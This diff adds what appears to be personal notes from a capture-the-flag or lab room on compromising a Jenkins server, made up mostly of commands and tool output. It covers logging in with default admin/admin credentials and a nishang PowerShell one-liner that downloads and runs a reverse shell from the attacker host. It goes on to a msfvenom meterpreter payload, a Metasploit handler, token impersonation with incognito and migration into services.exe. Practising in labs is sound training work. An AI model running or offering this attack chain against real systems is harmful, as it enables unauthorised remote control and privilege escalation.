@@ -1,0 +1,144 @@
+└─$ nmap -p- 10.10.81.181 --min-rate 5555 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 23:05 PDT
+Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 65.46% done; ETC: 23:05 (0:00:08 remaining)
+Nmap scan report for 10.10.81.181
+Host is up (0.39s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-proxy
+
+//login port 8080,jenkins, use default pass/username admin/admin.
+//find project, and console, use nishang webshell .
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.87.102:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.87.102 -Port 8821
+
+//set http.server on host, and rlwrap nvlistening
+//put payload into command box -> build -> view output
+//get shell
+
+//escalate to meterpreter shell
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.87.102 LPORT=8822 -f exe -o shell-name.exe
+
+//download the shell file
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.87.102:8080/shell.exe','shell.exe')"
+
+//start handler
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.13.87.102 set LPORT 8822 run
+
+Start-Process "shell.exe"
+
+msf6 exploit(multi/handler) > options
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > set LHOST 10.13.87.102
+LHOST => 10.13.87.102
+msf6 exploit(multi/handler) > set LPORT 8888
+LPORT => 8888
+msf6 exploit(multi/handler) > set LPORT 8822
+LPORT => 8822
+msf6 exploit(multi/handler) > set payload windows/
+Display all 286 possibilities? (y or n)
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.13.87.102:8822 
+[*] Sending stage (177734 bytes) to 10.10.35.237
+[*] Meterpreter session 1 opened (10.13.87.102:8822 -> 10.10.35.237:49224) at 2025-06-12 01:39:40 -0700
+//after .\shell.exe on target machine
+
+meterpreter > 
+
+C:\>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+
+meterpreter > load incognito
+Loading extension incognito...Success.
+meterpreter > use incognito 
+[!] The "incognito" extension has already been loaded.
+meterpreter > list_tokens -g
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+\
+BUILTIN\Administrators
+BUILTIN\Users
+NT AUTHORITY\Authenticated Users
+NT AUTHORITY\NTLM Authentication
+NT AUTHORITY\SERVICE
+NT AUTHORITY\This Organization
+NT SERVICE\AudioEndpointBuilder
+NT SERVICE\CertPropSvc
+NT SERVICE\CscService
+NT SERVICE\iphlpsvc
+NT SERVICE\LanmanServer
+NT SERVICE\PcaSvc
+NT SERVICE\Schedule
+NT SERVICE\SENS
+NT SERVICE\SessionEnv
+NT SERVICE\TrkWks
+NT SERVICE\UmRdpService
+NT SERVICE\UxSms
+NT SERVICE\WdiSystemHost
+NT SERVICE\Winmgmt
+NT SERVICE\wuauserv
+
+Impersonation Tokens Available  //this line
+========================================
+No tokens available
+//Ensure that you migrate to a process with correct permissions (the above question’s answer). The safest process to pick is the services.exe process.
+pgrep services.exe
+668
+migrate 668
+
+cat root.txt
+
+
+
